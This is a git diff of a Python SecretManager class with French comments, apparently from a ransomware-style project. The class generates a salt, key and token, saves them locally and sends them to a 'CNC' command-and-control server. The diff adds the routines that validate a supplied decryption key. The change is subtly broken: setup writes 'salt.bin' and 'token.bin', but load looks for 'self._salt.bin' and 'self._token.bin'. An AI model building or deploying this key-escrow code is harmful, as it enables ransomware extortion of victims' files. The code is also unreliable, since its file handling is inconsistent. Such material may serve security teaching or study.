@@ -64,9 +64,9 @@ class SecretManager:
 
     def setup(self) -> None:
         # Vérification de l'existence d'un fichier self._token.bin
-        if os.path.exists(os.path.join(self._path, "_token.bin")):
-            self._log.warning("Un fichier self._token.bin existe déjà. Annulation du setup.")
-        #     return
+        if os.path.exists(os.path.join(self._path, "token.bin")) or os.path.exists(os.path.join(self._path, "salt.bin")):
+            raise FileExistsError("Un fichier token.bin existe déjà. Annulation du setup.")
+        
 
         # Création des éléments cryptographiques
         self._salt, self._key, self._token = self.create()
@@ -75,32 +75,42 @@ class SecretManager:
         # Création du répertoire si nécessaire
         os.makedirs(self._path, exist_ok=True)
         # Sauvegarde du sel et du self._token en local
-        with open(os.path.join(self._path, "/self._salt.bin"), "wb") as self._salt_file:
+        with open(os.path.join(self._path, "salt.bin"), "wb") as self._salt_file:
             self._salt_file.write(self._salt)
-        with open(os.path.join(self._path, "/self._token.bin"), "wb") as self._token_file:
+        with open(os.path.join(self._path, "token.bin"), "wb") as self._token_file:
             self._token_file.write(self._token)
 
-
+        
         # Envoi des éléments cryptographiques au CNC
         self.post_new(self._salt, self._key, self._token)
 
     def load(self) -> None:
-        salt_path = os.path.join(self._path, "salt.bin")
+        salt_path = os.path.join(self._path, "self._salt.bin")
+        token_path = os.path.join(self._path, "self._token.bin")
 
-        if os.path.exists(salt_path):
+        if os.path.exists(salt_path) and os.path.exists(token_path):
             with open(salt_path, "rb") as salt_file:
                 self._salt = salt_file.read()
+            with open(token_path, "rb") as token_file:
+                self._token = token_file.read()
         else:
-            self._log.warning("Les fichiers self._salt.bin et/ou self.key.bin n'existent pas. Impossible de charger les données cryptographiques.")
+            self._log.warning("Les fichiers self._salt.bin et/ou self._token.bin n'existent pas. Impossible de charger les données cryptographiques.")
 
 
-    def check_key(self, candidate_key:bytes)->bool:
-        # Assert the key is valid
-        raise NotImplemented()
 
-    def set_key(self, b64_key:str)->None:
-        # If the key is valid, set the self._key var for decrypting
-        raise NotImplemented()
+    def check_key(self, candidate_key: bytes) -> bool:
+        token = self.do_derivation(self._salt, candidate_key)
+        return token == self._token
+
+
+    def set_key(self, b64_key: str) -> None:
+        candidate_key = base64.b64decode(b64_key)
+        
+        if self.check_key(candidate_key):
+            self._key = candidate_key
+        else:
+            raise ValueError("La clé fournie est invalide.")
+
 
     def get_hex_token(self) -> str:
         token_hash = sha256(self._token).hexdigest()
